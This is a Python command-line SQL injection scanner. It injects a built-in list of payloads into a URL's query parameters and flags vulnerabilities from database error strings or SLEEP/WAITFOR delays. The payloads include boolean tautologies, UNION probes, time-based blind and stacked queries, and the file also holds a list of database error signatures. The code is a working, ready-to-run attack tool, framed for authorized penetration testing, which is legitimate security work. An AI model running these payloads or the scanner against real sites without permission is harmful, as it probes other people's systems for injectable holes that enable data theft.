#!/usr/bin/env python3
"""
sqli_scanner.py — SQL Injection Vulnerability Scanner
------------------------------------------------------
A command-line tool to test web application URLs for common
SQL injection vulnerabilities using error-based, boolean-based,
and time-based detection techniques.

Author: (your name)
Version: 1.0
Tested on: Python 3.8+

DISCLAIMER:
    This tool is for authorized penetration testing and educational
    purposes ONLY. Do not run against systems you do not own or have
    explicit written permission to test. Unauthorized use is illegal.

Usage:
    python3 sqli_scanner.py -u "http://testsite.com/item?id=1"
    python3 sqli_scanner.py -u "http://testsite.com/item?id=1" --delay 0.5
    python3 sqli_scanner.py -u "http://testsite.com/item?id=1" --output report.txt
    python3 sqli_scanner.py -u "http://testsite.com/item?id=1" --payloads my_payloads.txt
"""

import argparse
import sys
import time
import urllib.parse
from datetime import datetime

# ── Third-party imports (fail gracefully with clear instructions) ─────────────
try:
    import requests
    from requests.exceptions import ConnectionError, Timeout, RequestException
except ImportError:
    print("[!] Required library 'requests' is not installed.")
    print("    Fix: pip install requests")
    sys.exit(1)

try:
    from colorama import Fore, Style, init as colorama_init
    colorama_init(autoreset=True)
    RED    = Fore.RED
    GREEN  = Fore.GREEN
    YELLOW = Fore.YELLOW
    CYAN   = Fore.CYAN
    BOLD   = Style.BRIGHT
    RESET  = Style.RESET_ALL
except ImportError:
    # Graceful fallback — tool still works without colours
    RED = GREEN = YELLOW = CYAN = BOLD = RESET = ""


# ─────────────────────────────────────────────────────────────────────────────
# Payload list — covers the most common SQLi classes seen in real assessments
# and CTF challenges. Extends well beyond automated scanner defaults.
# ─────────────────────────────────────────────────────────────────────────────
DEFAULT_PAYLOADS = [
    # ── Syntax probes (trigger parser errors) ────────────────────────────────
    "'",
    "''",
    '"',
    "`",
    "\\",
    # ── Boolean-based (classic) ───────────────────────────────────────────────
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1 --",
    "' OR 1=1#",
    '" OR "1"="1',
    "') OR ('1'='1",
    "1' OR 1=1 --",
    # ── UNION-based probes ────────────────────────────────────────────────────
    "' UNION SELECT NULL --",
    "' UNION SELECT NULL,NULL --",
    "' UNION SELECT NULL,NULL,NULL --",
    "' UNION SELECT 1 --",
    "' UNION SELECT 1,2 --",
    # ── Time-based blind (MySQL / MSSQL) ─────────────────────────────────────
    "' AND SLEEP(3) --",
    "'; SELECT SLEEP(3) --",
    "'; WAITFOR DELAY '0:0:3' --",
    "1; WAITFOR DELAY '0:0:3' --",
    # ── Stacked queries ───────────────────────────────────────────────────────
    "'; SELECT 1 --",
    "1; SELECT 1 --",
    # ── Comment variants ──────────────────────────────────────────────────────
    "' --",
    "' #",
    "'/*",
    "';--",
    "' OR 1=1 LIMIT 1 --",
]

# Error strings that indicate the database leaked an internal error
DB_ERROR_SIGNATURES = [
    # MySQL
    "you have an error in your sql syntax",
    "warning: mysql",
    "mysql_fetch",
    "mysql_num_rows",
    "supplied argument is not a valid mysql",
    # PostgreSQL
    "pg_query()",
    "pg_exec()",
    "postgresql query failed",
    # MSSQL
    "microsoft ole db provider for sql server",
    "unclosed quotation mark",
    "incorrect syntax near",
    "odbc sql server driver",
    "sqlserver jdbc driver",
    # Oracle
    "ora-01756",
    "ora-00933",
    "oracle error",
    # SQLite
    "sqlite3::query",
    "sqlite_",
    # Generic
    "sql syntax",
    "sql error",
    "invalid query",
    "sqlstate",
    "quoted string not properly terminated",
    "syntax error",
    "db2 sql error",
]


# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

def banner():
    print(f"""
{CYAN}{BOLD}╔═══════════════════════════════════════════════════╗
║   SQLi Scanner v1.0  |  Authorized Testing Only   ║
╚═══════════════════════════════════════════════════╝{RESET}
""")


def log_info(msg):    print(f"{GREEN}[+]{RESET} {msg}")
def log_warn(msg):    print(f"{YELLOW}[!]{RESET} {msg}")
def log_vuln(msg):    print(f"{RED}[VULN]{RESET} {msg}")
def log_status(msg):  print(f"[*] {msg}")


def load_payloads_from_file(filepath: str) -> list:
    """Read payloads from a text file (one per line, # = comment)."""
    try:
        with open(filepath) as f:
            payloads = [
                line.strip() for line in f
                if line.strip() and not line.startswith("#")
            ]
        log_info(f"Loaded {len(payloads)} payloads from '{filepath}'")
        return payloads
    except FileNotFoundError:
        log_warn(f"Payload file not found: {filepath}")
        sys.exit(1)


def parse_url_params(url: str) -> dict:
    """Extract query parameters from a URL as a flat dict."""
    parsed = urllib.parse.urlparse(url)
    raw    = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    return {k: v[0] for k, v in raw.items()}


def build_injected_url(url: str, param: str, payload: str) -> str:
    """Return a new URL with `param` replaced by `payload`."""
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [payload]
    new_query = urllib.parse.urlencode(params, doseq=True)
    return urllib.parse.urlunparse(parsed._replace(query=new_query))


def detect_error_based(response_text: str) -> tuple:
    """Return (True, matched_signature) if a DB error string is found."""
    lower = response_text.lower()
    for sig in DB_ERROR_SIGNATURES:
        if sig.lower() in lower:
            return True, sig
    return False, ""


# ─────────────────────────────────────────────────────────────────────────────
# Core scanner
# ─────────────────────────────────────────────────────────────────────────────

def scan_param(url, param, payloads, session, timeout, delay):
    """
    Test a single GET parameter with every payload.
    Returns a list of finding dicts.
    """
    findings = []

    for payload in payloads:
        test_url = build_injected_url(url, param, payload)

        try:
            t_start = time.time()
            resp    = session.get(test_url, timeout=timeout)
            elapsed = time.time() - t_start

            # ── Detection 1: error-based ──────────────────────────────────
            is_error, sig = detect_error_based(resp.text)

            # ── Detection 2: time-based ───────────────────────────────────
            is_sleep_payload = any(k in payload.lower() for k in ("sleep", "waitfor"))
            is_time_based    = is_sleep_payload and elapsed >= 2.8

            if is_error or is_time_based:
                dtype = "time-based blind" if is_time_based else "error-based"
                signature = f"response time {elapsed:.1f}s" if is_time_based else sig

                finding = {
                    "param":     param,
                    "payload":   payload,
                    "type":      dtype,
                    "signature": signature,
                    "test_url":  test_url,
                    "http_code": resp.status_code,
                }
                findings.append(finding)
                log_vuln(
                    f"param={YELLOW}{param}{RESET}  "
                    f"type={CYAN}{dtype}{RESET}  "
                    f"payload={payload!r}"
                )

        except Timeout:
            # A timeout on a sleep payload is itself a strong signal
            if any(k in payload.lower() for k in ("sleep", "waitfor")):
                finding = {
                    "param":     param,
                    "payload":   payload,
                    "type":      "time-based blind (timeout)",
                    "signature": "request timed out — consistent with blind SQLi",
                    "test_url":  test_url,
                    "http_code": "N/A",
                }
                findings.append(finding)
                log_warn(
                    f"Possible blind SQLi — param={param} timed out on sleep payload"
                )

        except (ConnectionError, RequestException) as exc:
            log_warn(f"Request failed (param={param}, payload={payload!r}): {exc}")

        if delay > 0:
            time.sleep(delay)

    return findings


# ─────────────────────────────────────────────────────────────────────────────
# Report writer
# ─────────────────────────────────────────────────────────────────────────────

def write_report(findings: list, target_url: str, output_path: str):
    with open(output_path, "w") as f:
        f.write("=" * 62 + "\n")
        f.write("  SQLi Scanner — Scan Report\n")
        f.write("=" * 62 + "\n")
        f.write(f"  Target : {target_url}\n")
        f.write(f"  Date   : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"  Result : {'VULNERABLE' if findings else 'No issues detected'}\n")
        f.write(f"  Count  : {len(findings)} finding(s)\n")
        f.write("=" * 62 + "\n\n")

        if not findings:
            f.write("No SQL injection vulnerabilities were detected.\n\n")
            f.write(
                "Note: A clean result does not guarantee the application is\n"
                "secure. This tool covers common patterns only. Manual review\n"
                "and further testing (e.g. sqlmap, manual blind injection)\n"
                "may be warranted.\n"
            )
        else:
            for i, v in enumerate(findings, 1):
                f.write(f"[Finding {i}]\n")
                f.write(f"  Parameter  : {v['param']}\n")
                f.write(f"  Type       : {v['type']}\n")
                f.write(f"  Signature  : {v['signature']}\n")
                f.write(f"  Payload    : {v['payload']}\n")
                f.write(f"  HTTP Code  : {v['http_code']}\n")
                f.write(f"  Test URL   : {v['test_url']}\n\n")

    log_info(f"Report saved → {output_path}")


# ─────────────────────────────────────────────────────────────────────────────
# Entry point
# ─────────────────────────────────────────────────────────────────────────────

def main():
    banner()

    parser = argparse.ArgumentParser(
        description="SQL Injection Scanner — for authorized testing only",
        epilog="Example: python3 sqli_scanner.py -u 'http://site.com/page?id=1'"
    )
    parser.add_argument("-u", "--url",
        required=True,
        help="Target URL with at least one query parameter")
    parser.add_argument("--payloads",
        default=None,
        help="Path to custom payload file (one per line)")
    parser.add_argument("--params",
        default=None,
        help="Comma-separated params to test (default: all detected params)")
    parser.add_argument("--timeout",
        type=int, default=8,
        help="HTTP request timeout in seconds (default: 8)")
    parser.add_argument("--delay",
        type=float, default=0.3,
        help="Delay between requests in seconds (default: 0.3)")
    parser.add_argument("--output",
        default=None,
        help="Save findings to a text report (auto-named if not specified)")
    args = parser.parse_args()

    # ── Validate URL ──────────────────────────────────────────────────────────
    if not args.url.startswith(("http://", "https://")):
        log_warn("URL must begin with http:// or https://")
        sys.exit(1)

    detected_params = parse_url_params(args.url)
    if not detected_params:
        log_warn("No query parameters found in URL.")
        print("       Make sure the URL looks like: http://site.com/page?id=1")
        sys.exit(1)

    # ── Parameter selection ───────────────────────────────────────────────────
    if args.params:
        wanted = [p.strip() for p in args.params.split(",")]
        test_params = {k: v for k, v in detected_params.items() if k in wanted}
        if not test_params:
            log_warn(f"None of the specified params {wanted} were found in the URL.")
            sys.exit(1)
    else:
        test_params = detected_params

    # ── Payloads ──────────────────────────────────────────────────────────────
    payloads = load_payloads_from_file(args.payloads) if args.payloads else DEFAULT_PAYLOADS

    # ── Print scan config ─────────────────────────────────────────────────────
    log_info(f"Target     : {args.url}")
    log_info(f"Parameters : {', '.join(test_params.keys())}")
    log_info(f"Payloads   : {len(payloads)}")
    log_info(f"Timeout    : {args.timeout}s  |  Delay: {args.delay}s")
    print()

    # ── Session setup ─────────────────────────────────────────────────────────
    session = requests.Session()
    session.headers["User-Agent"] = (
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/123.0 Safari/537.36"
    )

    # ── Baseline ──────────────────────────────────────────────────────────────
    try:
        baseline = session.get(args.url, timeout=args.timeout)
        log_status(f"Baseline → HTTP {baseline.status_code} | {len(baseline.text)} bytes\n")
    except RequestException as exc:
        log_warn(f"Cannot reach target: {exc}")
        sys.exit(1)

    # ── Scan ──────────────────────────────────────────────────────────────────
    all_findings = []
    for param in test_params:
        log_status(f"Testing parameter: {CYAN}{param}{RESET}")
        results = scan_param(
            url=args.url,
            param=param,
            payloads=payloads,
            session=session,
            timeout=args.timeout,
            delay=args.delay,
        )
        all_findings.extend(results)
        print()

    # ── Summary ───────────────────────────────────────────────────────────────
    print("─" * 50)
    if all_findings:
        print(f"{RED}{BOLD}[!] {len(all_findings)} vulnerability/ies detected.{RESET}")
        print(f"{YELLOW}    Review the findings carefully before reporting.{RESET}")
    else:
        print(f"{GREEN}[✓] No SQL injection vulnerabilities detected.{RESET}")
    print("─" * 50)

    # ── Report ────────────────────────────────────────────────────────────────
    if args.output:
        write_report(all_findings, args.url, args.output)
    elif all_findings:
        auto_name = f"sqli_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        write_report(all_findings, args.url, auto_name)


if __name__ == "__main__":
    main()
